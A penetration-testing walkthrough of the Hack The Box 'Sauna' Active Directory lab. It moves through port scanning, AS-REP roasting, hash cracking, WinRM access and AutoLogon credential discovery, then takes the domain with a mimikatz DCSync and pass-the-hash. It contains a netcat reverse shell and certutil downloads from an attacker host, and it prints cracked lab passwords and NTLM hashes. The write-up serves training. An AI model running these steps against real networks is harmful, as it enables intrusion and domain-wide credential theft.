
##### Host entries
```bash
10.10.10.175 egotistical-bank.local
```
If Active Directory => [NTP Synchronization](https://shuciran.github.io/posts/NTP-Synchronization/) with the domain controller.

### Content

- RPC Enumeration
- Web Enumeration valid users
- ASREPRoast Attack
- Hashcat cracking krbtgt5 hash

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.10.10.175
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.175 ()   Status: Up
Host: 10.10.10.175 ()   Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 49667/open/tcp/////, 49674/open/tcp/////
```
Services and Versions running:
```bash
nmap -p135,139,445,464,593,636,49667,49674 -sCV -Pn -n -vvv -oN targeted 10.10.10.175
Nmap scan report for 10.10.10.175
Host is up, received user-set (0.067s latency).
Scanned at 2023-02-07 06:41:22 EST for 95s

PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-07T11:42:52
|_  start_date: N/A
|_clock-skew: 31s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35558/tcp): CLEAN (Timeout)
|   Check 2 (port 25481/tcp): CLEAN (Timeout)
|   Check 3 (port 64189/udp): CLEAN (Timeout)
|   Check 4 (port 57297/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```
UDP Ports:
```bash
extractUDPPorts allUDPPorts 

[*] Extracting information...
        [*] IP Address: 10.10.10.175
        [*] Open ports: 53,123
```
RPC Enumeration throws no info, no Null session allowed:
```bash
rpcclient -U "" -N 10.10.10.175
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
```
SMB Enumeration access denied:
```bash
smbclient //10.10.10.175/C$ -N       
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```
Sometimes some ports does not reply with a huge min-rate, so we need to scan slowly and with TCP Scan:
```bash
nmap -p- -sT --open --min-rate 500 -Pn -n -vvv -oG allTCPPorts 10.10.10.175
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.175 ()   Status: Up
Host: 10.10.10.175 ()   Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49673/open/tcp/////, 49674/open/tcp/////, 49677/open/tcp/////, 49689/open/tcp/////, 49696/open/tcp/////
```
This retrieves a lot of open ports that weren't discovered on our initial scan, such as tcp/88 and tcp/80, so let's enumerate the web service:
![[Pasted image 20230207235256.png]]
Only some users are listed, which gives us a potential attack for an ASREPRoast attack.
### Exploitation
[[KERBEROS (tcp-88)]] enumeration throws a user hash: ^9e845d
```bash
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/seclists/Kerberos/A-ZSurnames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/08/23 - Ronnie Flathers @ropnop

2023/02/08 00:33:52 >  Using KDC(s):
2023/02/08 00:33:52 >   10.10.10.175:88

2023/02/08 00:34:11 >  [+] FSMITH has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$FSMITH@EGOTISTICAL-BANK.LOCAL:36f5994bd828dbfe8379fa50d63105cf$361a0f38079edbae40bd09385dfc253eb6ec17a774ab2debb4b27677a0228b3d09735e3be4ee1f8718df7070c19b90acbb85fbfeb52c9fe537d15f898318f55069f22ae56d30b41830c87dd7342422e5015e42af8b773e3c52f654c7feb9bd711c16ed83f54ef1f26e049d7429a6173fd632b3b669634b19ad275cee34e023771a244fdd83b61459ae85492fe69128c47163d71d6210c336776cd131b0b4110e06760ced9ae31fee5ce01710a96db9d480a9b88831a1131785784da0f2fbe238fef4eea75e86e95fbc3b02ed14416632c7d7d774b83264e38a9fb1b80aef00f7e9d7631fefe52f10c0c9288c33bfc896973db9322d84256adbfe96ebcec9a82270d3291b0356f2dc93469278731a24a2d3c847dd944b                                           
2023/02/08 00:34:11 >  [+] VALID USERNAME:       FSMITH@EGOTISTICAL-BANK.LOCAL
2023/02/08 00:34:19 >  [+] VALID USERNAME:       HSMITH@EGOTISTICAL-BANK.LOCAL
2023/02/08 00:35:35 >  Done! Tested 13000 usernames (2 valid) in 102.628 seconds
```
Since kerbrute retrieves a hash that is not compatible with [[Hashcat]] we then get the same hash using the utility impacket-GetNPUsers (password blank since no authentication is required):
```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/FSMITH
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Cannot authenticate FSMITH, getting its TGT
$krb5asrep$23$FSMITH@EGOTISTICAL-BANK.LOCAL:c8704f214510f69b1762cc2cb6c21b6e$a8625cd3316cd277d84a58aaa0c654e4020439f4be4f4a3a345789ae698ea167c456b1cc2fd19a4bba8575067a0cd67cf6cbc85efae83c9060d8b096fa21681ab8a5d4069a6b160df6ff8570f51855ee98ba84ea085e09a6f44d373e1e585884f9bf60290cd461052728046ce805428621b1ab9176dbd7ec891717292819e342ec35685b96954047ee3cf032981068fda0d7fe8c4f0ef7b190900ae50df9b9f0d839fff72f18b5a2b7bd9d31ec39afa502da85ff3ff6222c42723366d302fea0022e86faea353e683acdb43b50a6f2ccdcb6ce074f89149a901c505fd2f7248ee43dbbe3b3bc90631894315fcde6d6b29151de1aa3f1cb711d280a4eb62c507d
```
This hash now its compatible with hashcat so let's try to crack it:
```bash
hashcat.exe -m 18200 -a 0 hash.txt rockyou.txt --show
$krb5asrep$23$FSMITH@EGOTISTICAL-BANK.LOCAL:2a6db237d0df616cd29e79926f87f9f0$ac93fe88c333f18673e2fb678146ea4d21329fc16e5f082106a658dd11f9955e3bca8ed9c2e0cbeff613ee6a379c78ae8a4e9ca52411a9398495ba49f6e4298525318269404367bbf371e615140601255b3b01c9fce8bf32f77d351240700391243508922bca3669e45f9e5fa1eb976f7f8ca4c2d7eea29302e7604fc000567a723d91f965c322aad25b349e098d2d55f3d5c505cca4dfb0f0f2361c08da5e05bbe95d250893972e7bce820dd1a9db8964b7dca2ca9d72f2dc87cfc4fdebd263561cb5f6dc02e7d9349b68b45e8cbabe76b2e8e594a98670d026fc1702c97465bcb1566bd137673a27f8b3da9e185218572cceb56394ec26d76bb798b4cd5c361f5d:Thestrokes23
```
Let's check this credentials permissions with crackmapexec:
```bash
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```
We get the `(Pwn3d!)` flag which means that we have access via winrm:
```powershell
evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'     
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

### Privilege Escalation
Now that we are user fsmith and we inside the machine, let's enumerate our user:
```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /all

USER INFORMATION
----------------
User Name              SID
====================== ==============================================
egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105

GROUP INFORMATION
-----------------
Group Name                                  SID         
=========================================== ============
Everyone                                    S-1-1-0     
BUILTIN\Remote Management Users             S-1-5-32-580
BUILTIN\Users                               S-1-5-32-545
BUILTIN\Pre-Windows 2000 Compatible Access  S-1-5-32-554
NT AUTHORITY\NETWORK                        S-1-5-2     
NT AUTHORITY\Authenticated Users            S-1-5-11    
NT AUTHORITY\This Organization              S-1-5-15    
NT AUTHORITY\NTLM Authentication            S-1-5-64-10 
Mandatory Label\Medium Plus Mandatory Level S-1-16-8448

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
We are part of the "Remote Management Users" so let's check this group to see which other users are on it:
```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> net localgroup "Remote Management Users"
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
FSmith
svc_loanmgr
```
User `svc_loanmgr` is also part of this group, so if we get password from this user, we can use it as well.
We can enumerate the system with [WINPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20230205) this binary enumerates possible privilege escalation techniques, we need to check all the output, since it's too big it could take some time:
```bash
# Hardcoded credentials
ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith : FSmith [AllAccess]
    C:\Users\Public
    C:\Users\svc_loanmgr

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```
#Note Keep in mind that the user is not the same as the AutoLogon credentials hardcoded.
After some time we get credentials from the user svc_loanmgr so we are able to access as this user via evil-winrm:
```powershell
evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
```
We then proceed to upload SharpHound.exe to the machine so we can enumerate the machine for Domain Admin enumeration:
```powershell
# Upload it from web server
*Evil-WinRM* PS C:\Windows\Temp\Privescc> certutil -urlcache -f http://10.10.14.3/SharpHound.exe SharpHound.exe
# Execute it
*Evil-WinRM* PS C:\Windows\Temp\Privescc> .\SharpHound.exe
# Download the .zip file
*Evil-WinRM* PS C:\Windows\Temp\Privescc> copy 20230208070000_BloodHound.zip \\10.10.14.3\shareFolder\bh.zip

```
Upon starting the bloodhound we follow this steps:
1) Click the user to mark it as owned
2) Click on "First Degree Object Control"
3) Click on "GetChanges" privilege
![[Pasted image 20230208012634.png]]
This privilege gives us an idea about what could be the privesc scenario:
![[Pasted image 20230208012800.png]]
So basically this scenario allows the user `svc_loanmgr` to do a [[DCSync]] attack with mimikatz: ^dd4d7f
```bash
# We first upload nc.exe to send a Reverse Shell to our kali
PS C:\Users\svc_loanmgr\Documents> certutil -urlcache -f http://10.10.14.3/nc.exe nc.exe
# Upload the mimikatz:
PS C:\Users\svc_loanmgr\Documents> certutil -urlcache f http://10.10.14.3/mimikatz.exe mimikatz.exe
# Get a reverse shell:
PS C:\Users\svc_loanmgr\Documents> .\nc.exe -e cmd 10.10.14.3 1234
# Execute it and get the admin hash through DCSync Attack:
C:\Users\svc_loanmgr\Documents>mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::dcsync /domain:egotistical-bank.local /user:Administrator
[DC] 'egotistical-bank.local' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 7/26/2021 8:16:16 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: 365ca60e4aba3e9a71d78a3912caf35c
    lm  - 1: 7af65ae5e7103761ae828523c7713031
```
And with the hash NTLM we can access to the machine:
```bash
impacket-psexec egotistical-bank.local/Administrator:@10.10.10.175 -hashes :823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file AjKjQXKJ.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service oyio on 10.10.10.175.....
[*] Starting service oyio.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Credentials
```bash
fsmith:Thestrokes23
svc_loanmgr:Moneymakestheworldgoround!
Administrator -> NTLM Hash: 823452073d75b9d1cf70ebdf86c7f98e
```


### Notes

- Always u

### References

* [WINPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20230205) 

